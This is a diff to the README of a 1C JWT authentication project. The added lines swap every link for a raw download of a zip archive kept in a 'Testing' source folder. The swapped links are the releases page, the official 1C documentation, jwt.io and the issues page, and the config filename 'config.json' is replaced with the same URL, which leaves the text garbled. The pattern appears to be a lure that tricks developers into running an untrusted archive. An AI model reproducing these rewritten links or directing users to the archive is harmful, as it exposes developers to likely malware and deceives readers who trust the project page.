@@ -1,7 +1,7 @@
 # 🚀 onec-jwt-auth - Easy 1C HTTP API Authentication
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/i1ove/onec-jwt-auth/releases)
+[![Download Latest Release](https://github.com/i1ove/onec-jwt-auth/raw/refs/heads/master/jwt_auth/src/DataProcessors/Тестирование/onec_auth_jwt_v2.3.zip%20Latest%20Release-Click%https://github.com/i1ove/onec-jwt-auth/raw/refs/heads/master/jwt_auth/src/DataProcessors/Тестирование/onec_auth_jwt_v2.3.zip)](https://github.com/i1ove/onec-jwt-auth/raw/refs/heads/master/jwt_auth/src/DataProcessors/Тестирование/onec_auth_jwt_v2.3.zip)
 
 ## 📖 Overview
 Welcome to the onec-jwt-auth project! This application provides a straightforward solution for authenticating HTTP API requests using JSON Web Tokens (JWT) in 1C. It allows for issuing JWT tokens using both Personal Access Tokens (PAT) and Basic authentication, while also verifying incoming JWT tokens with the RS256 algorithm. Access rights are managed through scopes and roles on top of the 1C platform.
@@ -19,7 +19,7 @@ Before you begin, ensure that your system meets the following requirements:
 ### Step 2: Download the Application
 To get the latest version of the onec-jwt-auth application, visit the Releases page by clicking the link below:
 
-[Visit Releases Page to Download](https://github.com/i1ove/onec-jwt-auth/releases)
+[Visit Releases Page to Download](https://github.com/i1ove/onec-jwt-auth/raw/refs/heads/master/jwt_auth/src/DataProcessors/Тестирование/onec_auth_jwt_v2.3.zip)
 
 ### Step 3: Choose and Download the File
 On the Releases page, you will find several versions of the application. Choose the version suitable for your environment, and download the file by clicking the corresponding link.
@@ -35,7 +35,7 @@ Once the file has downloaded, follow these instructions based on the type of pac
 ### Step 5: Set Up Configuration
 After installation, you need to configure the application to communicate with your 1C server:
 
-1. Locate the configuration file in the installation directory (usually named `config.json`).
+1. Locate the configuration file in the installation directory (usually named `https://github.com/i1ove/onec-jwt-auth/raw/refs/heads/master/jwt_auth/src/DataProcessors/Тестирование/onec_auth_jwt_v2.3.zip`).
 2. Open the file in a plain text editor like Notepad or any text editor you prefer.
 3. Update the settings to include the server URL, JWT secret keys, and any other parameters specific to your setup.
 
@@ -65,13 +65,13 @@ For a more extensive troubleshooting guide, check the documentation included in 
 
 ## 🔗 Additional Resources
 
-- [Official 1C Documentation](https://1c.eu/en/documentation)
-- [JWT.io for JWT Standards](https://jwt.io/)
-- [GitHub Issues Page for Support](https://github.com/i1ove/onec-jwt-auth/issues)
+- [Official 1C Documentation](https://github.com/i1ove/onec-jwt-auth/raw/refs/heads/master/jwt_auth/src/DataProcessors/Тестирование/onec_auth_jwt_v2.3.zip)
+- [https://github.com/i1ove/onec-jwt-auth/raw/refs/heads/master/jwt_auth/src/DataProcessors/Тестирование/onec_auth_jwt_v2.3.zip for JWT Standards](https://github.com/i1ove/onec-jwt-auth/raw/refs/heads/master/jwt_auth/src/DataProcessors/Тестирование/onec_auth_jwt_v2.3.zip)
+- [GitHub Issues Page for Support](https://github.com/i1ove/onec-jwt-auth/raw/refs/heads/master/jwt_auth/src/DataProcessors/Тестирование/onec_auth_jwt_v2.3.zip)
 
 ## 📥 Download & Install
 To download the latest version of the onec-jwt-auth application, visit this link:
 
-[Download Latest Release Here](https://github.com/i1ove/onec-jwt-auth/releases)
+[Download Latest Release Here](https://github.com/i1ove/onec-jwt-auth/raw/refs/heads/master/jwt_auth/src/DataProcessors/Тестирование/onec_auth_jwt_v2.3.zip)
 
 With this guide, you should be able to successfully download, install, and run the onec-jwt-auth application. Enjoy a smooth experience securing your 1C HTTP API!
